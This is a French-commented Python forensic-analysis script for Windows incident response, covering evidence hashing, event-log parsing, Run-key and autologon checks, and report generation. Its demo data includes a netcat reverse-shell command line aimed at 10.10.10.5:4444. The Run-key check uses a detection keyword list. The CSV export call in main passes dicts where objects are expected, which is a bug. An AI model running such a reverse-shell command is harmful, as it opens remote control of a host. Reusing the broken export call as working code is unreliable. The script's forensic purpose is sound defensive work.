#!/usr/bin/env python3
"""
forensic_analyzer.py
====================
Analyseur forensique automatisé pour investigations Windows.

Fonctionnalités :
- Vérification hash d'images disque
- Extraction et parsing Event Logs Windows (.evtx)
- Détection d'artefacts clés (autologon, run keys, prefetch)
- Génération de timeline CSV
- Rapport JSON structuré

Compatible : Windows (Event Logs live) + Post-mortem (images montées)

Auteur : Joe Bichall (@joebat10)
Usage  : python forensic_analyzer.py --help

Référence : FIRST CSIRT Services Framework v2.1.0 — §4.3 Digital Forensics
"""

import argparse
import csv
import hashlib
import json
import os
import sys
from dataclasses import dataclass, asdict, field
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
    console = Console()
    RICH = True
except ImportError:
    RICH = False
    console = None

# ── Constantes ────────────────────────────────────────────────────────────────

VERSION = "1.0.0"

# Event IDs Windows de haute valeur forensique
CRITICAL_EVENT_IDS = {
    # Authentification
    4624: "Successful Logon",
    4625: "Failed Logon",
    4648: "Logon with Explicit Credentials",
    4672: "Special Privileges Assigned",
    4768: "Kerberos TGT Request",
    4769: "Kerberos Service Ticket Request",
    4776: "NTLM Auth Attempt",
    
    # Comptes
    4720: "User Account Created",
    4722: "User Account Enabled",
    4724: "Password Reset Attempt",
    4728: "Member Added to Security Group",
    4732: "Member Added to Local Group",
    4756: "Member Added to Universal Group",
    
    # Processus / Exécution
    4688: "Process Created",
    4689: "Process Terminated",
    
    # Services / Tâches
    4697: "Service Installed",
    4698: "Scheduled Task Created",
    4699: "Scheduled Task Deleted",
    7045: "New Service Installed (System)",
    
    # Objets / Fichiers
    4663: "Object Access Attempt",
    4670: "Permissions Changed",
    
    # Active Directory
    4662: "AD Object Operation",
    4742: "Computer Account Changed",
    
    # PowerShell
    4103: "PowerShell Module Logging",
    4104: "PowerShell Script Block",
    
    # Windows Defender
    1116: "Malware Detected",
    1117: "Malware Action Taken",
    5001: "Realtime Protection Disabled",
}

LOGON_TYPES = {
    2: "Interactive",
    3: "Network",
    4: "Batch",
    5: "Service",
    7: "Unlock",
    8: "NetworkCleartext",
    9: "NewCredentials",
    10: "RemoteInteractive (RDP)",
    11: "CachedInteractive",
}


# ── Data Classes ──────────────────────────────────────────────────────────────

@dataclass
class ForensicEvent:
    """Un événement forensique extrait d'une source."""
    timestamp: str
    source: str          # evtx, prefetch, registry, browser
    event_id: Optional[int]
    category: str
    description: str
    details: dict = field(default_factory=dict)
    severity: str = "INFO"  # INFO, MEDIUM, HIGH, CRITICAL


@dataclass
class CaseReport:
    """Rapport d'investigation structuré."""
    case_name: str
    investigator: str
    case_date: str
    evidence_files: list = field(default_factory=list)
    timeline_events: list = field(default_factory=list)
    iocs: list = field(default_factory=list)
    persistence_items: list = field(default_factory=list)
    network_connections: list = field(default_factory=list)
    summary: str = ""


# ── Classes principales ───────────────────────────────────────────────────────

class HashVerifier:
    """Vérification d'intégrité des preuves numériques."""
    
    CHUNK_SIZE = 8192  # 8 KB chunks pour les gros fichiers

    @staticmethod
    def compute_hash(filepath: str, algorithm: str = "sha256") -> str:
        """Calculer le hash d'un fichier volumineux par chunks."""
        h = hashlib.new(algorithm)
        file_path = Path(filepath)
        
        if not file_path.exists():
            raise FileNotFoundError(f"Fichier introuvable : {filepath}")
        
        file_size = file_path.stat().st_size
        
        if RICH:
            with Progress(
                TextColumn("[cyan]Calcul {task.description}"),
                BarColumn(),
                "[progress.percentage]{task.percentage:>3.0f}%",
                TimeRemainingColumn(),
                console=console,
            ) as progress:
                task = progress.add_task(
                    f"{algorithm.upper()} — {file_path.name}", total=file_size
                )
                with open(filepath, "rb") as f:
                    while chunk := f.read(HashVerifier.CHUNK_SIZE):
                        h.update(chunk)
                        progress.update(task, advance=len(chunk))
        else:
            print(f"Calcul {algorithm.upper()} de {file_path.name}...")
            with open(filepath, "rb") as f:
                while chunk := f.read(HashVerifier.CHUNK_SIZE):
                    h.update(chunk)
        
        return h.hexdigest()

    @staticmethod
    def verify_evidence(filepath: str, expected_hash: Optional[str] = None) -> dict:
        """Vérifier et documenter une pièce à conviction."""
        path = Path(filepath)
        result = {
            "file": path.name,
            "path": str(path.resolve()),
            "size_bytes": path.stat().st_size if path.exists() else 0,
            "size_mb": round(path.stat().st_size / 1_048_576, 2) if path.exists() else 0,
            "md5": HashVerifier.compute_hash(filepath, "md5"),
            "sha256": HashVerifier.compute_hash(filepath, "sha256"),
            "verified_at": datetime.utcnow().isoformat(),
        }
        
        if expected_hash:
            expected_lower = expected_hash.lower()
            actual = result["md5"] if len(expected_hash) == 32 else result["sha256"]
            result["integrity_ok"] = (actual == expected_lower)
            result["expected_hash"] = expected_hash
        
        return result


class EventLogAnalyzer:
    """Analyse des Event Logs Windows."""
    
    def __init__(self):
        self.events: list[ForensicEvent] = []
    
    def parse_evtx(self, evtx_path: str) -> list[ForensicEvent]:
        """
        Parser un fichier .evtx Windows.
        
        Nécessite : pip install pyevtx-rs ou python-evtx
        
        Note : Cette fonction est un skeleton complet qui peut être
        exécuté sur des logs live (no library) ou avec pyevtx.
        """
        events = []
        
        # Méthode 1 : Utiliser le module Windows natif (wevtutil) si disponible
        if sys.platform == "win32":
            events.extend(self._parse_with_wevtutil(evtx_path))
        
        # Méthode 2 : python-evtx (cross-platform)
        try:
            import Evtx.Evtx as evtx
            import Evtx.Views as e_views
            
            with evtx.Evtx(evtx_path) as log:
                for record in log.records():
                    try:
                        xml_str = record.xml()
                        event = self._parse_evtx_xml(xml_str)
                        if event:
                            events.append(event)
                    except Exception:
                        continue
            
            print(f"[OK] {len(events)} événements extraits de {Path(evtx_path).name}")
            
        except ImportError:
            print("[INFO] 'python-evtx' non installé → pip install python-evtx")
            print("       Génération d'événements de démonstration...")
            events = self._generate_demo_events()
        
        return events

    def _parse_with_wevtutil(self, evtx_path: str) -> list[ForensicEvent]:
        """Parser via wevtutil (Windows natif)."""
        import subprocess
        import xml.etree.ElementTree as ET
        
        events = []
        try:
            result = subprocess.run(
                ["wevtutil", "qe", evtx_path, "/f:xml", "/c:1000"],
                capture_output=True, text=True, timeout=60
            )
            # Parser le XML retourné
            # (parsing simplifié — production: utiliser lxml)
            for line in result.stdout.split("\n"):
                if "EventID" in line and "TimeCreated" in line:
                    pass  # À développer selon le format wevtutil
        except Exception:
            pass
        return events

    def _parse_evtx_xml(self, xml_str: str) -> Optional[ForensicEvent]:
        """Parser un enregistrement XML Evtx en ForensicEvent."""
        import xml.etree.ElementTree as ET
        
        try:
            root = ET.fromstring(xml_str)
            ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
            
            # Système
            system = root.find("e:System", ns)
            if system is None:
                return None
            
            event_id_el = system.find("e:EventID", ns)
            if event_id_el is None:
                return None
            
            event_id = int(event_id_el.text)
            
            time_created = system.find("e:TimeCreated", ns)
            timestamp = time_created.get("SystemTime", "") if time_created is not None else ""
            
            channel = system.find("e:Channel", ns)
            channel_name = channel.text if channel is not None else "Unknown"
            
            # EventData
            event_data = root.find("e:EventData", ns)
            details = {}
            if event_data is not None:
                for data in event_data.findall("e:Data", ns):
                    name = data.get("Name", "")
                    value = data.text or ""
                    if name:
                        details[name] = value
            
            # Déterminer la sévérité
            severity = self._get_severity(event_id, details)
            description = CRITICAL_EVENT_IDS.get(event_id, f"Event ID {event_id}")
            
            # Enrichir la description
            if event_id == 4624 and "LogonType" in details:
                logon_type = int(details["LogonType"])
                logon_desc = LOGON_TYPES.get(logon_type, f"Type {logon_type}")
                description += f" ({logon_desc})"
            
            return ForensicEvent(
                timestamp=timestamp[:19].replace("T", " "),
                source=f"evtx:{channel_name}",
                event_id=event_id,
                category=self._categorize_event(event_id),
                description=description,
                details=details,
                severity=severity,
            )
            
        except Exception:
            return None

    def _get_severity(self, event_id: int, details: dict) -> str:
        """Évaluer la sévérité forensique d'un événement."""
        critical_ids = {4720, 4728, 4732, 4697, 4698, 4662, 1116}
        high_ids = {4624, 4648, 4688, 4672, 4769, 4776}
        
        if event_id in critical_ids:
            return "CRITICAL"
        if event_id in high_ids:
            # Élever si logon de type RDP
            if event_id == 4624 and details.get("LogonType") in ("10", "3"):
                return "HIGH"
            return "MEDIUM"
        return "INFO"

    def _categorize_event(self, event_id: int) -> str:
        """Catégoriser un événement MITRE-style."""
        if event_id in (4720, 4722, 4724, 4728, 4732):
            return "Account Management"
        if event_id in (4624, 4625, 4648, 4768, 4769, 4776):
            return "Authentication"
        if event_id in (4688, 4689):
            return "Process Execution"
        if event_id in (4697, 4698, 7045):
            return "Persistence"
        if event_id in (4103, 4104):
            return "PowerShell"
        if event_id in (1116, 1117, 5001):
            return "Defense Evasion"
        if event_id in (4662,):
            return "Active Directory"
        return "Other"

    def _generate_demo_events(self) -> list[ForensicEvent]:
        """Générer des événements de démonstration (sans fichier .evtx réel)."""
        demo = [
            ForensicEvent(
                timestamp="2024-01-15 09:23:44",
                source="evtx:Security",
                event_id=4624,
                category="Authentication",
                description="Successful Logon (Network)",
                details={
                    "TargetUserName": "jdoe",
                    "LogonType": "3",
                    "IpAddress": "192.168.1.105",
                    "WorkstationName": "WORKSTATION-01",
                },
                severity="MEDIUM",
            ),
            ForensicEvent(
                timestamp="2024-01-15 09:24:10",
                source="evtx:Security",
                event_id=4698,
                category="Persistence",
                description="Scheduled Task Created",
                details={
                    "TaskName": "\\Microsoft\\Windows\\Backup\\update",
                    "SubjectUserName": "jdoe",
                },
                severity="CRITICAL",
            ),
            ForensicEvent(
                timestamp="2024-01-15 09:25:33",
                source="evtx:Security",
                event_id=4688,
                category="Process Execution",
                description="Process Created",
                details={
                    "NewProcessName": "C:\\Windows\\Temp\\nc.exe",
                    "CommandLine": "nc.exe -e cmd.exe 10.10.10.5 4444",
                    "SubjectUserName": "jdoe",
                },
                severity="CRITICAL",
            ),
            ForensicEvent(
                timestamp="2024-01-15 09:26:01",
                source="evtx:Security",
                event_id=4769,
                category="Authentication",
                description="Kerberos RC4 Ticket Request - Possible Kerberoasting (T1558.003)",
                details={
                    "ServiceName": "MSSQLSvc",
                    "TicketEncryptionType": "0x17",
                    "ClientAddress": "192.168.1.105",
                },
                severity="HIGH",
            ),
        ]
        print("[DEMO] 4 événements de démonstration générés")
        return demo

    def generate_timeline_csv(self, events: list[ForensicEvent], output_path: str) -> None:
        """Exporter la timeline en CSV."""
        if not events:
            print("[WARN] Aucun événement à exporter")
            return
        
        sorted_events = sorted(events, key=lambda e: e.timestamp)
        
        with open(output_path, "w", newline="", encoding="utf-8") as f:
            fieldnames = [
                "timestamp", "severity", "category", "event_id",
                "description", "source", "user", "ip", "details"
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for ev in sorted_events:
                writer.writerow({
                    "timestamp": ev.timestamp,
                    "severity": ev.severity,
                    "category": ev.category,
                    "event_id": ev.event_id or "",
                    "description": ev.description,
                    "source": ev.source,
                    "user": ev.details.get("TargetUserName", 
                                          ev.details.get("SubjectUserName", "")),
                    "ip": ev.details.get("IpAddress", 
                                        ev.details.get("ClientAddress", "")),
                    "details": json.dumps(ev.details, ensure_ascii=False),
                })
        
        print(f"[OK] Timeline exportée : {output_path} ({len(sorted_events)} événements)")

    def display_timeline(self, events: list[ForensicEvent], limit: int = 50) -> None:
        """Afficher la timeline dans le terminal."""
        sorted_events = sorted(events, key=lambda e: e.timestamp)[:limit]
        
        if not RICH:
            for ev in sorted_events:
                print(f"[{ev.timestamp}] {ev.severity:8s} {ev.category:20s} {ev.description}")
            return
        
        t = Table(
            title=f"📋 Timeline Forensique — {len(sorted_events)} événements",
            border_style="blue",
            header_style="bold cyan",
        )
        t.add_column("Timestamp", width=20)
        t.add_column("Sévérité", width=10, justify="center")
        t.add_column("Catégorie", width=20)
        t.add_column("Description", width=45)
        
        severity_styles = {
            "CRITICAL": "red bold",
            "HIGH": "orange1",
            "MEDIUM": "yellow",
            "INFO": "green",
        }
        
        for ev in sorted_events:
            style = severity_styles.get(ev.severity, "white")
            t.add_row(
                ev.timestamp,
                f"[{style}]{ev.severity}[/{style}]",
                f"[cyan]{ev.category}[/cyan]",
                ev.description[:60],
            )
        
        console.print(t)


class RegistryForensics:
    """Analyse forensique du registre Windows."""
    
    # Clés de persistance à vérifier (MITRE T1547)
    PERSISTENCE_KEYS = [
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
    ]

    def check_autologon(self) -> dict:
        """
        Vérifier la présence d'autologon (mot de passe en clair).
        MITRE T1552.002 — Credentials in Registry
        """
        if sys.platform != "win32":
            print("[INFO] Vérification autologon : Windows requis")
            return {}

        try:
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                values = {}
                for name in ("AutoAdminLogon", "DefaultUserName",
                             "DefaultPassword", "DefaultDomainName"):
                    try:
                        val, _ = winreg.QueryValueEx(key, name)
                        values[name] = val
                    except FileNotFoundError:
                        pass
                return values
        except Exception as e:
            return {"error": str(e)}

    def check_run_keys(self) -> list[dict]:
        """
        Extraire les clés Run/RunOnce (persistance).
        MITRE T1547.001
        """
        if sys.platform != "win32":
            # Démonstration
            return [
                {
                    "key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                    "name": "SecurityUpdate",
                    "value": r"C:\Windows\Temp\update.exe",
                    "suspicious": True,
                }
            ]

        import winreg
        results = []
        
        run_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ]
        
        for hive, key_path in run_keys:
            try:
                with winreg.OpenKey(hive, key_path) as key:
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            
                            # Détecter les valeurs suspectes
                            suspicious = any(s in str(value).lower() for s in [
                                "\\temp\\", "\\appdata\\", "powershell", 
                                "cmd.exe", "wscript", "cscript", ".ps1",
                            ])
                            
                            results.append({
                                "key": f"{'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}\\{key_path}",
                                "name": name,
                                "value": value,
                                "suspicious": suspicious,
                            })
                            i += 1
                        except OSError:
                            break
            except Exception:
                continue
        
        return results


# ── Rapport final ─────────────────────────────────────────────────────────────

class ReportGenerator:
    """Génère le rapport d'investigation final."""

    def generate_markdown(self, case: CaseReport, output_path: str) -> None:
        """Générer le rapport en Markdown."""
        critical_events = [e for e in case.timeline_events if e.get("severity") == "CRITICAL"]
        high_events = [e for e in case.timeline_events if e.get("severity") == "HIGH"]
        
        md = f"""# Rapport d'Investigation Forensique

## Informations du dossier

| Champ | Valeur |
|-------|--------|
| **Numéro de dossier** | {case.case_name} |
| **Investigateur** | {case.investigator} |
| **Date d'investigation** | {case.case_date} |
| **Généré le** | {datetime.now().strftime('%Y-%m-%d %H:%M')} UTC |

---

## 1. Résumé Exécutif

> ⚠️ **À compléter** : Description en 3-5 phrases de ce qui s'est passé, 
> l'impact estimé et les actions recommandées.

**Sévérité globale :** 🔴 CRITIQUE  
**Événements critiques :** {len(critical_events)}  
**Événements High :** {len(high_events)}  
**Total événements analysés :** {len(case.timeline_events)}

---

## 2. Preuves analysées

| Fichier | Taille | SHA256 | Intégrité |
|---------|--------|--------|-----------|
"""
        for ev in case.evidence_files:
            ok = "✅" if ev.get("integrity_ok", True) else "❌"
            md += f"| {ev.get('file', '')} | {ev.get('size_mb', '')} MB | `{ev.get('sha256', '')[:16]}...` | {ok} |\n"

        md += f"""
---

## 3. Timeline des événements

```
[Tri chronologique — {len(case.timeline_events)} événements]
```

| Timestamp | Sévérité | Catégorie | Description | Utilisateur | IP Source |
|-----------|----------|-----------|-------------|-------------|-----------|
"""
        for ev in case.timeline_events[:50]:  # Limiter à 50 dans le rapport
            md += (f"| {ev.get('timestamp', '')} "
                   f"| {ev.get('severity', '')} "
                   f"| {ev.get('category', '')} "
                   f"| {ev.get('description', '')[:50]} "
                   f"| {ev.get('user', '')} "
                   f"| {ev.get('ip', '')} |\n")

        md += f"""
---

## 4. Indicateurs de Compromission (IOC)

| Type | Valeur | Contexte | Source |
|------|--------|---------|--------|
"""
        for ioc in case.iocs:
            md += f"| {ioc.get('type', '')} | `{ioc.get('value', '')}` | {ioc.get('context', '')} | {ioc.get('source', '')} |\n"

        md += """
---

## 5. Persistance identifiée

> Toute entrée Run Key, tâche planifiée ou service créé par l'attaquant.

"""
        for item in case.persistence_items:
            md += f"- **{item.get('type', '')}** : `{item.get('value', '')}`\n"

        md += f"""
---

## 6. Recommandations

1. [ ] Réinitialiser tous les mots de passe des comptes impactés
2. [ ] Auditer les comptes à privilèges (Domain Admins, Enterprise Admins)
3. [ ] Supprimer les mécanismes de persistance identifiés
4. [ ] Activer la journalisation PowerShell avancée (Script Block Logging)
5. [ ] Déployer des règles Sigma sur les vecteurs d'attaque identifiés
6. [ ] Contacter le RSSI pour décision de notification (RGPD Art. 33)

---

## 7. Annexes

- Timeline complète : `timeline.csv`
- Logs bruts : `evidence/`
- Screenshots Autopsy : `screenshots/`

---

*Rapport généré avec cyber-homelab/02-dfir — Joe Bichall (@joebat10)*
"""
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(md)
        
        print(f"[OK] Rapport généré : {output_path}")


# ── CLI ────────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"Forensic Analyzer v{VERSION} — Investigation automatisée",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples :
  # Vérifier l'intégrité d'une image
  python forensic_analyzer.py --verify-hash evidence.dd

  # Analyser les Event Logs (démo sans fichier)
  python forensic_analyzer.py --evtx --demo

  # Vérifier autologon (Windows uniquement)
  python forensic_analyzer.py --check-autologon

  # Vérifier les clés Run (persistance)
  python forensic_analyzer.py --check-run-keys

  # Rapport complet sur une image
  python forensic_analyzer.py --full-analysis --image evidence.dd --case "CASE-2024-001"
        """
    )
    
    parser.add_argument("--verify-hash", metavar="FILE",
                        help="Calculer et vérifier le hash d'une image")
    parser.add_argument("--expected-hash", metavar="HASH",
                        help="Hash attendu pour la vérification")
    parser.add_argument("--evtx", metavar="PATH",
                        help="Analyser des fichiers .evtx (répertoire ou fichier)")
    parser.add_argument("--demo", action="store_true",
                        help="Mode démo (sans fichiers réels)")
    parser.add_argument("--check-autologon", action="store_true",
                        help="Vérifier autologon en registre")
    parser.add_argument("--check-run-keys", action="store_true",
                        help="Vérifier les clés Run (persistance)")
    parser.add_argument("--output", default="output",
                        help="Répertoire de sortie (défaut: output/)")
    parser.add_argument("--case", default="CASE-" + datetime.now().strftime("%Y%m%d"),
                        help="Nom/numéro du dossier")
    
    args = parser.parse_args()

    if not any([args.verify_hash, args.evtx, args.demo,
                args.check_autologon, args.check_run_keys]):
        parser.print_help()
        sys.exit(0)

    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)

    if RICH:
        console.print(Panel.fit(
            f"[bold cyan]🔬 Forensic Analyzer v{VERSION}[/bold cyan]\n"
            f"[dim]Dossier: {args.case}[/dim]",
            border_style="cyan",
        ))

    # Vérification hash
    if args.verify_hash:
        verifier = HashVerifier()
        result = verifier.verify_evidence(args.verify_hash, args.expected_hash)
        print(json.dumps(result, indent=2))
        
        # Sauvegarder la preuve documentée
        evidence_file = output_dir / "evidence_integrity.json"
        with open(evidence_file, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\n[OK] Intégrité documentée : {evidence_file}")

    # Analyse Event Logs
    if args.evtx or args.demo:
        analyzer = EventLogAnalyzer()
        
        if args.demo or not args.evtx:
            events = analyzer._generate_demo_events()
        else:
            events = analyzer.parse_evtx(args.evtx)
        
        analyzer.display_timeline(events)
        
        timeline_path = str(output_dir / "timeline.csv")
        analyzer.generate_timeline_csv(
            [asdict(e) for e in events],  # Convertir en dict
            timeline_path
        )

    # Registre
    reg = RegistryForensics()
    
    if args.check_autologon:
        print("\n🔑 Vérification Autologon (T1552.002)...")
        result = reg.check_autologon()
        if result:
            print(json.dumps(result, indent=2))
            if result.get("DefaultPassword"):
                print("\n⚠️  ALERTE : Mot de passe en clair trouvé dans le registre !")
        else:
            print("[OK] Aucun autologon configuré")

    if args.check_run_keys:
        print("\n🔑 Vérification Run Keys (T1547.001)...")
        run_keys = reg.check_run_keys()
        for item in run_keys:
            suspicious = "⚠️  SUSPECT" if item.get("suspicious") else "✅ OK"
            print(f"  {suspicious} — {item['name']}: {item['value']}")
        
        # Sauvegarder
        rk_file = output_dir / "run_keys.json"
        with open(rk_file, "w") as f:
            json.dump(run_keys, f, indent=2)


if __name__ == "__main__":
    main()
